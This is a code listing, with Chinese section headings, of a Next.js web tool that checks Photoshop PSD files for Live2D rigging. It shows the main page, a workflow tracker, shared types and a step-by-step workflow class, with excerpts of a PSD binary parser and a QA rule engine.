const ChatAssistant = dynamic(() => import('../components/ChatAssistant'), {
  ssr: false,
  loading: () => (
    <div className="h-full min-h-[400px] bg-gray-900/50 border border-gray-800 rounded-xl animate-pulse" />
  ),
});

const ImageToPsd = dynamic(() => import('../components/ImageToPsd'), {
  ssr: false,
  loading: () => (
    <div className="h-[60vh] bg-gray-900/50 border border-gray-800 rounded-xl animate-pulse" />
  ),
});

type AppView = 'upload' | 'result';
type AppMode = 'qa' | 'convert';
type LoadingStage = 'idle' | 'loading' | 'parsing' | 'analyzing' | 'complete';

const Home: NextPage = () => {
  const [view, setView] = useState<AppView>('upload');
  const [mode, setMode] = useState<AppMode>('qa');
  const [loadingStage, setLoadingStage] = useState<LoadingStage>('idle');
  const [error, setError] = useState<string | null>(null);
  const [fileInfo, setFileInfo] = useState<{ name: string; size: number; width: number; height: number } | undefined>();
  const [result, setResult] = useState<{
    score: number;
    issues: QAIssue[];
    warnings: QAIssue[];
    suggestions: string[];
    layer_stats: {
      total: number;
      visible: number;
      hidden: number;
      groups: number;
      empty: number;
      semiTransparent: number;
      nonNormalBlend: number;
      offscreen: number;
      duplicateNames: number;
    };
    summary: {
      totalLayers: number;
      visibleLayers: number;
      hiddenLayers: number;
      groups: number;
      hasMissingCritical: boolean;
      hasNamingIssues: boolean;
      hasStructuralIssues: boolean;
    };
  } | null>(null);

  const workflowRef = useRef<Live2DWorkflow>(new Live2DWorkflow());
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [expertMode, setExpertMode] = useState(false);
  const [completedSteps, setCompletedSteps] = useState<boolean[]>([false, false, false, false, false, false, false, false]);

  useEffect(() => {
    const workflow = workflowRef.current;
    const state = workflow.getState();
    setCurrentStepIndex(state.currentStep - 1);
    setCompletedSteps([...state.completed]);
    setExpertMode(state.mode === 'expert');
  }, []);

  const handleUpload = useCallback(async (file: File) => {
    setLoadingStage('loading');
    setError(null);

    if (file.size > 50 * 1024 * 1024) {
      setError('文件大小超过限制 (最大 50MB)');
      setLoadingStage('idle');
      return;
    }

    try {
      setLoadingStage('parsing');
      const buffer = await file.arrayBuffer();
      const psdInfo = parsePSD(buffer);

      if (!psdInfo.valid) {
        const errorInfo = getErrorMessage(psdInfo.error);
        setError(`${errorInfo.title}: ${errorInfo.message}\n\n建议: ${errorInfo.suggestion}`);
        setLoadingStage('idle');
        return;
      }

      setLoadingStage('analyzing');
      const qaResult = analyzePSD(psdInfo);
      const enhanced = getEnhancedResult(qaResult);

      setFileInfo({
        name: file.name,
        size: file.size,
        width: psdInfo.width,
        height: psdInfo.height,
      });

      setResult({
        score: enhanced.score,
        issues: enhanced.issues,
        warnings: enhanced.warnings,
        suggestions: enhanced.suggestions,
        layer_stats: enhanced.layer_stats,
        summary: qaResult.summary,
      });

      setLoadingStage('complete');
      setTimeout(() => setView('result'), 300);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      const errorInfo = getErrorMessage(msg);
      setError(`${errorInfo.title}: ${errorInfo.message}\n\n建议: ${errorInfo.suggestion}`);
      setLoadingStage('idle');
    }
  }, []);

  const handleReset = useCallback(() => {
    setView('upload');
    setFileInfo(undefined);
    setResult(null);
    setError(null);
  }, []);

  const handleSetMode = useCallback((newMode: AppMode) => {
    setMode(newMode);
    setError(null);
  }, []);

  const handleClearError = useCallback(() => setError(null), []);

  const handleWorkflowReset = useCallback(() => {
    const workflow = workflowRef.current;
    workflow.reset();
    setCurrentStepIndex(0);
    setCompletedSteps([false, false, false, false, false, false, false, false]);
    setExpertMode(false);
  }, []);

  const handleStepClick = useCallback((stepIndex: number) => {
    const workflow = workflowRef.current;
    
    if (expertMode || stepIndex <= currentStepIndex) {
      workflow.goToStep(stepIndex + 1);
      setCurrentStepIndex(stepIndex);
    }
  }, [expertMode, currentStepIndex]);

  const [touchStart, setTouchStart] = useState<number | null>(null);
  const [touchEnd, setTouchEnd] = useState<number | null>(null);

  const minSwipeDistance = 50;

  const onTouchStart = (e: React.TouchEvent) => {
    setTouchEnd(null);
    setTouchStart(e.targetTouches[0].clientX);
  };

  const onTouchMove = (e: React.TouchEvent) => {
    setTouchEnd(e.targetTouches[0].clientX);
  };

  const onTouchEnd = () => {
    if (!touchStart || !touchEnd) return;
    
    const distance = touchStart - touchEnd;
    const isLeftSwipe = distance > minSwipeDistance;
    const isRightSwipe = distance < -minSwipeDistance;
    
    if (isLeftSwipe && expertMode) {
      if (currentStepIndex < 7) {
        handleStepClick(currentStepIndex + 1);
      }
    }
    
    if (isRightSwipe && expertMode) {
      if (currentStepIndex > 0) {
        handleStepClick(currentStepIndex - 1);
      }
    }
    
    setTouchStart(null);
    setTouchEnd(null);
  };

  const handleCompleteStep = useCallback(() => {
    const workflow = workflowRef.current;
    workflow.markCurrentStepComplete();
    setCompletedSteps([...workflow.getState().completed]);

    if (currentStepIndex < 7) {
      workflow.nextStep();
      setCurrentStepIndex(currentStepIndex + 1);
    }
  }, [currentStepIndex]);

  const handleToggleExpertMode = useCallback(() => {
    const workflow = workflowRef.current;
    const newMode = expertMode ? 'wizard' : 'expert';
    
    if (newMode === 'expert') {
      workflow.switchToExpert();
    } else {
      workflow.switchToWizard();
    }
    setExpertMode(!expertMode);
  }, [expertMode]);

  const layerTreeData = useMemo(() => {
    if (!result) return [];
    return result.issues.map((i, idx) => ({
      index: idx,
      name: i.layer || 'unknown',
      visible: true,
      opacity: 1,
      depth: 0,
      isGroup: false,
      bounds: { width: 0, height: 0 },
      issues: [i.title],
    }));
  }, [result?.issues]);

  return (
    <ErrorBoundary>
      <div className="min-h-screen bg-[#0f0f13] text-white sm:min-h-[100vh]">
      <SEO />

      <header className="border-b border-gray-800 sticky top-0 z-50 bg-[#0f0f13]/95 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-3 sm:px-4 py-2 sm:py-3 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <span className="text-xl sm:text-2xl">🎨</span>
            <div className="hidden sm:block">
              <h1 className="text-base sm:text-lg font-bold text-pink-400">Live2D PSD QA</h1>
              <p className="text-xs text-gray-500">Web版 PSD 质量检测工具</p>
            </div>
            <div className="sm:hidden">
              <h1 className="text-base font-bold text-pink-400">Live2D QA</h1>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <div className="flex bg-gray-800 rounded-lg p-0.5 mr-2">
              <button
                onClick={() => handleSetMode('qa')}
                className={`text-xs px-2 sm:px-3 py-1 sm:py-1.5 rounded-md transition-all ${mode === 'qa' ? 'bg-pink-500 text-white shadow-sm' : 'text-gray-400 hover:text-white'}`}
              >
                PSD 检测
              </button>
              <button
                onClick={() => handleSetMode('convert')}
                className={`text-xs px-2 sm:px-3 py-1 sm:py-1.5 rounded-md transition-all ${mode === 'convert' ? 'bg-emerald-500 text-white shadow-sm' : 'text-gray-400 hover:text-white'}`}
              >
                图片转PSD
              </button>
            </div>
            {result && (
              <button
                onClick={handleReset}
                className="text-xs sm:text-sm text-gray-400 hover:text-white px-2 sm:px-3 py-1 sm:py-1.5 rounded-lg bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                ↺ 重新分析
              </button>
            )}
            <button
              onClick={handleToggleExpertMode}
              className={`text-xs sm:text-sm px-2 sm:px-3 py-1 sm:py-1.5 rounded-lg transition-colors ${expertMode ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' : 'text-gray-400 hover:text-white bg-gray-800 hover:bg-gray-700'}`}
            >

...（省略后续 211 行，原文件共 491 行）...

```

## 工作流跟踪组件
**文件**：`web/components/WorkflowTracker.tsx`
```
import React from 'react';
import { STEP_NAMES } from '../lib-shared/types';

export interface WorkflowTrackerProps {
  currentStep: number;
  completed: boolean[];
  mode: 'wizard' | 'expert';
  onStepClick?: (stepIndex: number) => void;
}

const CheckIcon = React.memo(() => (
  <svg className="w-5 h-5" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path
      d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
      fill="currentColor"
    />
  </svg>
));
CheckIcon.displayName = 'CheckIcon';

const ChevronRightIcon = React.memo(({ className = '' }: { className?: string }) => (
  <svg className={`w-4 h-4 ${className}`} viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path
      d="M5.5 3l5 5-5 5"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    />
  </svg>
));
ChevronRightIcon.displayName = 'ChevronRightIcon';

const SpinnerIcon = React.memo(() => (
  <svg className="w-5 h-5 animate-spin" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="10" cy="10" r="9" stroke="currentColor" strokeWidth="2" strokeOpacity="0.2" />
    <path
      d="M19 10C19 15 15 19 10 19"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
    />
  </svg>
));
SpinnerIcon.displayName = 'SpinnerIcon';

export default React.memo(function WorkflowTracker({
  currentStep,
  completed,
  mode,
  onStepClick,
}: WorkflowTrackerProps) {
  const totalSteps = STEP_NAMES.length;
  const completedCount = completed.filter(c => c).length;
  const progress = totalSteps > 0 ? Math.round((completedCount / totalSteps) * 100) : 0;

  const handleStepClick = (index: number) => {
    if (mode === 'expert' && onStepClick) {
      onStepClick(index);
    }
  };

  return (
    <div className="bg-gray-800/40 backdrop-blur-xl rounded-xl p-4 sm:p-6 border border-gray-700/50">
      <div className="flex items-center justify-between mb-6">
        <h3 className="text-white font-semibold text-base sm:text-lg">工作流进度</h3>
        <div className="flex items-center gap-2">
          <span className="text-pink-400 font-bold text-lg sm:text-xl">{progress}%</span>
          <span className="text-gray-500 text-xs sm:text-sm">已完成</span>
        </div>
      </div>

      <div className="relative mb-6">
        <div className="h-1.5 bg-gray-700/50 rounded-full overflow-hidden">
          <div
            className="h-full bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500 rounded-full transition-all duration-500 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>

      <div className="space-y-3">
        {STEP_NAMES.map((stepName, index) => {
          const stepNum = index + 1;
          const isCompleted = completed[index];
          const isCurrent = stepNum === currentStep;
          const isPending = !isCompleted && !isCurrent;
          const isClickable = mode === 'expert' && onStepClick;

          return (
            <div
              key={stepNum}
              className={`
                relative flex items-center gap-3 p-3 rounded-lg transition-all duration-300
                ${isCurrent
                  ? 'bg-gradient-to-r from-pink-500/20 to-purple-500/20 border border-pink-500/30'
                  : isCompleted
                  ? 'bg-gray-700/30'
                  : 'bg-transparent opacity-60'
                }
                ${isClickable ? 'cursor-pointer hover:bg-gray-700/50' : ''}
              `}
              onClick={() => handleStepClick(index)}
            >
              <div
                className={`
                  relative w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0
                  transition-all duration-300
                  ${isCurrent
                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 ring-2 ring-pink-500/30'
                    : isCompleted
                    ? 'bg-green-500/20 text-green-400'
                    : 'bg-gray-700 text-gray-500'
                  }
                `}
              >
                {isCompleted ? (
                  <CheckIcon />
                ) : isCurrent ? (
                  <SpinnerIcon />
                ) : (
                  <span className="text-sm font-medium">{stepNum}</span>
                )}
              </div>

              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <span
                    className={`
                      font-medium text-sm sm:text-base truncate
                      ${isCurrent ? 'text-pink-300' : isCompleted ? 'text-green-300' : 'text-gray-400'}
                    `}
                  >
                    {stepName}
                  </span>
                  {isClickable && (
                    <ChevronRightIcon className="text-gray-500 flex-shrink-0" />
                  )}
                </div>
              </div>

              {isCurrent && (
                <div className="flex-shrink-0">
                  <span className="px-2 py-1 bg-pink-500/20 text-pink-400 text-xs font-medium rounded-full">
                    进行中
                  </span>
                </div>
              )}
            </div>
          );
        })}
      </div>

      {mode === 'expert' && (
        <div className="mt-4 pt-4 border-t border-gray-700/50">
          <p className="text-xs text-gray-500 flex items-center gap-2">
            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            专家模式：点击任意步骤可跳转
          </p>
        </div>
      )}
    </div>
  );
});

```

## 共享类型定义
**文件**：`web/lib-shared/types.ts`
```
export type WorkflowMode = 'wizard' | 'expert';

export interface CharacterConcept {
  type: 'vtuber' | 'anime-girl' | 'chibi' | 'other';
  features: string[];
  style: 'cute' | 'elegant' | 'cool' | 'other';
  description: string;
}

export interface PsdLayer {
  name: string;
  group?: string;
  drawOrder: number;
  description: string;
}

export interface PsdLayerPlan {
  layers: PsdLayer[];
  recommendations: string[];
}

export interface QAIssue {
  severity: 'error' | 'warning' | 'info';
  message: string;
  suggestion: string;
}

export interface QAReport {
  issues: QAIssue[];
  overallScore: number;
  passed: boolean;
}

export interface CubismParam {
  name: string;
  min: number;
  max: number;
  default: number;
  description: string;
}

export interface CubismParamConfig {
  parameters: CubismParam[];
}

export interface PhysicsPart {
  name: string;
  gravity: number;
  wind: number;
  restitution: number;
  damping: number;
}

export interface PhysicsConfig {
  parts: PhysicsPart[];
}

export interface RiggingGuide {
  steps: string[];
  tips: string[];
  bestPractices: string[];
}

export interface UserPreferences {
  style: string;
  defaultParams: Record<string, any>;
}

export interface WorkflowArtifacts {
  concept?: CharacterConcept;
  characterImage?: string;
  psdPlan?: PsdLayerPlan;
  psdFile?: string;
  qaReport?: QAReport;
  cubismParams?: CubismParamConfig;
  physicsConfig?: PhysicsConfig;
  riggingGuide?: RiggingGuide;
}

export interface Live2DWorkflowState {
  mode: WorkflowMode;
  currentStep: number;
  completed: boolean[];
  artifacts: WorkflowArtifacts;
  preferences?: UserPreferences;
}

export const STEP_NAMES = [
  '概念设定',
  '立绘生成',
  'PSD 分层规划',
  '图片转 PSD',
  'PSD 质检',
  'Cubism 参数设计',
  '物理设置',
  'Rigging 指导'
] as const;

export type WorkflowStepNumber = 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8;

```

## 共享工作流类型
**文件**：`web/lib-shared/workflow.ts`
```
import { 
  Live2DWorkflowState, 
  WorkflowMode,
  STEP_NAMES,
  CharacterConcept,
  PsdLayerPlan,
  QAReport,
  CubismParamConfig,
  PhysicsConfig,
  RiggingGuide
} from './types';

export class Live2DWorkflow {
  private state: Live2DWorkflowState;

  constructor(initialState?: Partial<Live2DWorkflowState>) {
    this.state = {
      mode: 'wizard',
      currentStep: 1,
      completed: [false, false, false, false, false, false, false, false],
      artifacts: {},
      ...initialState
    };
  }

  getState(): Live2DWorkflowState {
    return { ...this.state };
  }

  getCurrentStep(): number {
    return this.state.currentStep;
  }

  getMode(): WorkflowMode {
    return this.state.mode;
  }

  getCurrentStepName(): string {
    return STEP_NAMES[this.state.currentStep - 1] || '';
  }

  switchToWizard(): void {
    this.state.mode = 'wizard';
  }

  switchToExpert(): void {
    this.state.mode = 'expert';
  }

  nextStep(): void {
    if (this.state.currentStep < 8) {
      this.state.currentStep++;
    }
  }

  prevStep(): void {
    if (this.state.currentStep > 1) {
      this.state.currentStep--;
    }
  }

  goToStep(step: number): void {
    if (step >= 1 && step <= 8) {
      this.state.currentStep = step;
    }
  }

  skipStep(): void {
    this.state.completed[this.state.currentStep - 1] = true;
    if (this.state.currentStep < 8) {
      this.state.currentStep++;
    }
  }

  markStepComplete(step: number): void {
    if (step >= 1 && step <= 8) {
      this.state.completed[step - 1] = true;
    }
  }

  markCurrentStepComplete(): void {
    this.markStepComplete(this.state.currentStep);
  }

  isStepComplete(step: number): boolean {
    return this.state.completed[step - 1] || false;
  }

  getProgress(): { completed: number; total: number } {
    const completed = this.state.completed.filter(c => c).length;
    return { completed, total: 8 };
  }

  setConcept(concept: CharacterConcept): void {
    this.state.artifacts.concept = concept;
  }

  setCharacterImage(imagePath: string): void {
    this.state.artifacts.characterImage = imagePath;
  }

  setPsdPlan(plan: PsdLayerPlan): void {
    this.state.artifacts.psdPlan = plan;
  }

  setPsdFile(filePath: string): void {
    this.state.artifacts.psdFile = filePath;
  }

  setQAReport(report: QAReport): void {
    this.state.artifacts.qaReport = report;
  }

  setCubismParams(params: CubismParamConfig): void {
    this.state.artifacts.cubismParams = params;
  }

  setPhysicsConfig(config: PhysicsConfig): void {
    this.state.artifacts.physicsConfig = config;
  }

  setRiggingGuide(guide: RiggingGuide): void {
    this.state.artifacts.riggingGuide = guide;
  }

  reset(): void {
    this.state = {
      mode: 'wizard',
      currentStep: 1,
      completed: [false, false, false, false, false, false, false, false],
      artifacts: {}
    };
  }

  parseCommand(input: string): { action: string; params?: any } {
    const lower = input.toLowerCase().trim();
    
    if (lower.includes('下一步') || lower.includes('继续') || lower === 'next') {
      return { action: 'nextStep' };
    }
    if (lower.includes('上一步') || lower.includes('返回') || lower === 'prev') {
      return { action: 'prevStep' };
    }
    if (lower.includes('跳过') || lower === 'skip') {
      return { action: 'skipStep' };
    }
    if (lower.includes('专家模式') || lower.includes('expert')) {
      return { action: 'switchToExpert' };
    }
    if (lower.includes('向导模式') || lower.includes('wizard')) {
      return { action: 'switchToWizard' };
    }
    if (lower.includes('重置') || lower.includes('重新开始') || lower === 'reset') {
      return { action: 'reset' };
    }
    if (lower.includes('查看进度') || lower.includes('进度')) {
      return { action: 'showProgress' };
    }
    
    const stepMatch = lower.match(/步骤?\s*(\d+)/);
    if (stepMatch) {
      return { action: 'goToStep', params: { step: parseInt(stepMatch[1]) } };
    }
    
    return { action: 'input', params: { value: input } };
  }

  getWizardPrompt(): string {
    const step = this.state.currentStep;
    const stepName = this.getCurrentStepName();
    
    const prompts: Record<number, string> = {
      1: `[步骤 1/8] ${stepName}\n\n请告诉我：\n1. 角色类型（VTuber/动漫女孩/Q版/其他）\n2. 主要特征（发型、发色、服装风格等）\n3. 整体氛围（可爱/优雅/酷/其他）\n\n或者说"跳过此步"如果你已经有立绘了。`,
      2: `[步骤 2/8] ${stepName}\n\n请描述你想要的立绘风格，或者上传参考图片。我会帮你生成适合 Live2D 的角色立绘。`,
      3: `[步骤 3/8] ${stepName}\n\n请上传你的角色立绘，我会帮你规划完整的 PSD 图层结构。`,
      4: `[步骤 4/8] ${stepName}\n\n请上传你的角色图片，我会帮你转换成基本的分层 PSD。`,
      5: `[步骤 5/8] ${stepName}\n\n请上传你的 PSD 文件，我会检查是否符合 Live2D 规范。`,
      6: `[步骤 6/8] ${stepName}\n\n我会根据你的 PSD 设计 Cubism 参数配置。`,
      7: `[步骤 7/8] ${stepName}\n\n请告诉我角色的动态部件（头发长度、是否有耳朵/尾巴等），我会提供物理参数建议。`,
      8: `[步骤 8/8] ${stepName}\n\n我会提供完整的 Rigging 操作指南！`
    };
    
    return prompts[step] || '请告诉我你想做什么。';
  }

  getExpertPrompt(): string {
    const progress = this.getProgress();
    let progressText = '当前进度：\n';
    STEP_NAMES.forEach((name, i) => {
      const done = this.state.completed[i] ? '✓' : ' ';
      progressText += `- [${done}] 步骤 ${i + 1}: ${name}\n`;
    });
    
    return `已切换到专家模式。🔧\n\n${progressText}\n可用任务：\n1. [2] 生成角色立绘\n2. [3] 规划 PSD 分层\n3. [4] 图片转 PSD\n4. [5] 检查 PSD 文件\n5. [6] 设计 Cubism 参数\n6. [7] 物理设置建议\n7. [8] Rigging 指导\n8. [向导模式] 回到向导模式\n\n你想做什么？`;
  }
}

export const createWorkflow = (initialState?: Partial<Live2DWorkflowState>) => {
  return new Live2DWorkflow(initialState);
};

```

## PSD 解析器（节选）
**文件**：`web/lib/psd-parser.ts`
```
export interface PSDFileInfo {
  width: number;
  height: number;
  depth: number;
  colorMode: number;
  colorModeName: string;
  layerCount: number;
  layers: PSDLayer[];
  groups: PSDGroup[];
  valid: boolean;
  error?: string;
}

export interface PSDLayer {
  index: number;
  name: string;
  visible: boolean;
  opacity: number;
  blendMode: string;
  bounds: {
    top: number;
    left: number;
    bottom: number;
    right: number;
    width: number;
    height: number;
  };
  isGroup: boolean;
  groupId: string | null;
  isGroupEnd: boolean;
  channels: number;
  hasImageData: boolean;
  flags: {
    transparencyProtected: boolean;
    visible: boolean;
    obsolete: boolean;
    pixelDataIrrelevant: boolean;
  };
  depth: number;
}

export interface PSDGroup {
  id: string;
  name: string;
  layerIndex: number;
  layerIds: number[];
  depth: number;
}

class PSDReader {
  private buf: Uint8Array;
  private view: DataView;

  constructor(buf: Uint8Array) {
    this.buf = buf;
    this.view = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
  }

  readAscii(offset: number, length: number): string {
    let s = '';
    for (let i = 0; i < length; i++) {
      s += String.fromCharCode(this.buf[offset + i]);
    }
    return s;
  }

  readUInt8(offset: number): number {
    return this.view.getUint8(offset);
  }

  readUInt16BE(offset: number): number {
    return this.view.getUint16(offset);
  }

  readInt16BE(offset: number): number {
    return this.view.getInt16(offset);
  }

  readUInt32BE(offset: number): number {
    return this.view.getUint32(offset);
  }

  readInt32BE(offset: number): number {
    return this.view.getInt32(offset);
  }

  slice(start: number, end: number): Uint8Array {
    return this.buf.slice(start, end);
  }

  get length(): number {
    return this.buf.length;
  }

  getByte(offset: number): number {
    return this.buf[offset];
  }
}

function readPascalString(r: PSDReader, offset: number): { value: string; length: number } {
  const charCount = r.readUInt8(offset);
  let s = '';
  for (let i = 0; i < charCount; i++) {
    s += String.fromCharCode(r.getByte(offset + 1 + i));
  }
  const padded = ((charCount + 1 + 3) & ~3);
  return { value: s, length: padded };
}

function readUnicodeString(r: PSDReader, offset: number): { value: string; length: number } {
  const charCount = r.readUInt32BE(offset);
  const end = offset + 4 + charCount * 2;
  let s = '';
  for (let i = offset + 4; i < end; i += 2) {
    const code = (r.readUInt8(i) << 8) | r.readUInt8(i + 1);
    s += String.fromCharCode(code);
  }
  return { value: s, length: 4 + charCount * 2 };
}

function getColorModeName(mode: number): string {
  const modes: Record<number, string> = {
    0: 'Bitmap', 1: 'Grayscale', 2: 'Indexed', 3: 'RGB',
    4: 'CMYK', 5: 'Multi-channel', 6: 'Duotone', 7: 'Lab',
    8: '16-bit Grayscale', 9: '32-bit Grayscale', 10: '16-bit RGB', 11: '32-bit RGB',
  };
  return modes[mode] || `Unknown (${mode})`;
}

function parsePSDHeader(r: PSDReader): { width: number; height: number; depth: number; colorMode: number; offset: number } {
  const signature = r.readAscii(0, 4);
  const version = r.readUInt16BE(4);

  if (signature !== '8BPS') {
    throw new Error('Invalid PSD signature');
  }
  if (version !== 1) {
    throw new Error(`Unsupported PSD version: ${version}`);
  }

  const height = r.readUInt32BE(14);
  const width = r.readUInt32BE(18);
  const depth = r.readUInt16BE(22);
  const colorMode = r.readUInt16BE(24);

  return { width, height, depth, colorMode, offset: 26 };
}

function parsePSDLayers(r: PSDReader, startOffset: number): { layers: PSDLayer[]; groups: PSDGroup[]; offset: number } {
  const layers: PSDLayer[] = [];
  const groups: PSDGroup[] = [];
  let offset = startOffset;
  const groupStack: { name: string; id: string; index: number; depth: number }[] = [];
  let groupCount = 0;

  if (offset + 4 > r.length) {
    return { layers, groups, offset };
  }

  const layerInfoLength = r.readInt32BE(offset);
  offset += 4;

  const layerInfoEnd = offset + layerInfoLength;
  if (layerInfoEnd > r.length) {
    return { layers, groups, offset: r.length };
  }

  if (offset + 2 > r.length) {
    return { layers, groups, offset };
  }

  let layerCount = r.readInt16BE(offset);
  offset += 2;

  if (layerCount < 0) {
    layerCount = Math.abs(layerCount);
  }

  if (layerCount > 1000) {
    return { layers, groups, offset: layerInfoEnd };
  }

  for (let i = 0; i < layerCount; i++) {
    if (offset + 48 > r.length) break;

    const top = r.readInt32BE(offset); offset += 4;
    const left = r.readInt32BE(offset); offset += 4;
    const bottom = r.readInt32BE(offset); offset += 4;
    const right = r.readInt32BE(offset); offset += 4;

    const channelCount = r.readUInt16BE(offset); offset += 2;

    for (let c = 0; c < channelCount; c++) {
      offset += 6;
    }

    const blendSignature = r.readAscii(offset, 4);
    offset += 4;

    const blendMode = r.readAscii(offset, 4);
    offset += 4;

    const opacity = r.readUInt8(offset); offset += 1;
    const clipping = r.readUInt8(offset); offset += 1;
    const flags = r.readUInt8(offset); offset += 1;
    const filler = r.readUInt8(offset); offset += 1;

    const visible = !(flags & 0x02);

    const extraDataLength = r.readInt32BE(offset); offset += 4;
    const extraStart = offset;
    const extraEnd = offset + extraDataLength;

    let layerName = `Layer ${i}`;

    while (offset + 4 <= extraEnd) {
      const sig = r.readAscii(offset, 4);
      offset += 4;

      if (offset + 4 > extraEnd) break;
      const key = r.readAscii(offset, 4);
      offset += 4;

      if (offset + 4 > extraEnd) break;
      const dataLen = r.readInt32BE(offset);
      offset += 4;

      if (offset + dataLen > extraEnd) break;

      if (sig === '8BIM' && key === 'luni') {
        const result = readUnicodeString(r, offset);
        if (result.value) {
          layerName = result.value;
        }
      }

      offset += ((dataLen + 3) & ~3);
    }

    offset = extraEnd;

    const isGroupEnd = layerName === '</Layer group>';

    let actualIsGroup = false;
    let actualGroupId: string | null = null;

    if (layerName.startsWith('<')) {
      if (layerName === '</Layer group>') {
        if (groupStack.length > 0) {
          groupStack.pop();

...（省略后续 101 行，原文件共 351 行）...

```

## QA 引擎（节选）
**文件**：`web/lib/qa-engine.ts`
```
import { PSDFileInfo, PSDLayer } from './psd-parser';
import { 
  allRules, 
  LayerRule, 
  LayerCheckResult,
  LayerIssue 
} from '../rules';

export interface QAIssue {
  id: string;
  severity: 'error' | 'warning' | 'info';
  category: IssueCategory;
  title: string;
  description: string;
  layer?: string;
  suggestion: string;
  rule: string;
  expected?: string;
  actual?: string;
}

export type IssueCategory =
  | 'naming'
  | 'structure'
  | 'visibility'
  | 'bounds'
  | 'symmetry'
  | 'completeness'
  | 'performance'
  | 'convention';

export interface QAScore {
  total: number;
  naming: number;
  structure: number;
  completeness: number;
  convention: number;
  symmetry: number;
  visibility: number;
  performance: number;
}

export interface LayerStats {
  total: number;
  visible: number;
  hidden: number;
  groups: number;
  empty: number;
  semiTransparent: number;
  nonNormalBlend: number;
  offscreen: number;
  duplicateNames: number;
}

export interface QAResult {
  score: QAScore;
  issues: QAIssue[];
  warnings: QAIssue[];
  suggestions: string[];
  layer_stats: LayerStats;
  summary: {
    totalLayers: number;
    visibleLayers: number;
    hiddenLayers: number;
    groups: number;
    hasMissingCritical: boolean;
    hasNamingIssues: boolean;
    hasStructuralIssues: boolean;
  };
}

export interface EnhancedQAResult {
  score: number;
  issues: QAIssue[];
  warnings: QAIssue[];
  suggestions: string[];
  layer_stats: LayerStats;
}

export class QAEngine {
  private issues: QAIssue[] = [];
  private warnings: QAIssue[] = [];
  private suggestions: Set<string> = new Set();
  private psd: PSDFileInfo;
  private layerStats: LayerStats;
  private rules: LayerRule[];

  constructor(psd: PSDFileInfo, customRules?: LayerRule[]) {
    this.psd = psd;
    this.rules = customRules || allRules;
    this.layerStats = this.initLayerStats();
  }

  private initLayerStats(): LayerStats {
    return {
      total: this.psd.layers.length,
      visible: this.psd.layers.filter(l => l.visible).length,
      hidden: this.psd.layers.filter(l => !l.visible).length,
      groups: this.psd.groups.length,
      empty: 0,
      semiTransparent: 0,
      nonNormalBlend: 0,
      offscreen: 0,
      duplicateNames: 0,
    };
  }

  analyze(): QAResult {
    this.issues = [];
    this.warnings = [];
    this.suggestions = new Set();
    this.layerStats = this.initLayerStats();

    if (!this.psd.valid) {
      this.addIssue({
        id: 'psd_invalid',
        severity: 'error',
        category: 'structure',
        title: 'PSD 文件无效',
        description: this.psd.error || '无法解析 PSD 文件',
        suggestion: '请确保上传有效的 PSD 文件',
        rule: 'PSD-001',
      });
      return this.buildResult();
    }

    this.runAllRules();

    this.layerStats.empty = this.psd.layers.filter(l =>
      l.channels === 0 || (l.bounds.width === 0 && l.bounds.height === 0)
    ).length;

    this.layerStats.semiTransparent = this.psd.layers.filter(l =>
      l.visible && l.opacity > 0 && l.opacity < 0.9
    ).length;

    this.layerStats.nonNormalBlend = this.psd.layers.filter(l =>
      l.visible && l.blendMode !== 'norm' && l.blendMode !== 'norma'
    ).length;

    this.layerStats.offscreen = this.psd.layers.filter(l =>
      l.visible && l.bounds.width > 0 && l.bounds.height > 0 &&
      (l.bounds.right < 0 || l.bounds.bottom < 0 ||
       l.bounds.left > this.psd.width || l.bounds.top > this.psd.height)
    ).length;

    const nameCount = new Map<string, number>();
    for (const layer of this.psd.layers) {
      const name = layer.name.trim().toLowerCase();
      nameCount.set(name, (nameCount.get(name) || 0) + 1);
    }
    this.layerStats.duplicateNames = [...nameCount.entries()].filter(
      ([_, count]) => count > 1
    ).length;

    return this.buildResult();
  }

  private runAllRules() {
    for (const rule of this.rules) {
      try {
        const result: LayerCheckResult = rule.check(
          this.psd.layers,
          this.psd.width,
          this.psd.height,
          this.psd.colorMode
        );

        for (const issue of result.issues) {
          const qaIssue: QAIssue = {
            id: `${rule.id}_${this.issues.length + this.warnings.length}`,
            severity: rule.severity,
            category: rule.category as IssueCategory,
            title: rule.name,
            description: issue.details,
            layer: issue.layer,
            suggestion: '',
            rule: rule.id.toUpperCase(),
            expected: issue.expected,
            actual: issue.actual,
          };

          if (rule.severity === 'error') {
            this.addIssue(qaIssue);
          } else {
            this.addWarning(qaIssue);
          }
        }

        for (const suggestion of result.suggestions) {
          this.suggestions.add(suggestion);
        }
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        this.addIssue({
          id: `${rule.id}_error`,
          severity: 'error',
          category: 'structure',
          title: `${rule.name} 检测异常`,
          description: `规则 "${rule.name}" 执行时发生错误: ${errorMessage}`,
          suggestion: '请检查 PSD 文件是否正常，或联系开发者',
          rule: rule.id.toUpperCase(),
        });
      }
    }
  }

